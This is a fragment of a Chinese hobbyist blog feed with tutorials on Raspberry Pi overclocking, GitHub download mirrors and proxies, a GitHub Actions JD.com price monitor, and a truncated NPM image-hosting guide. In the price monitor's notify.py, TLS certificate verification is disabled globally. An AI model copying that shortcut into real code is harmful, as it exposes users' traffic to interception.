the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span 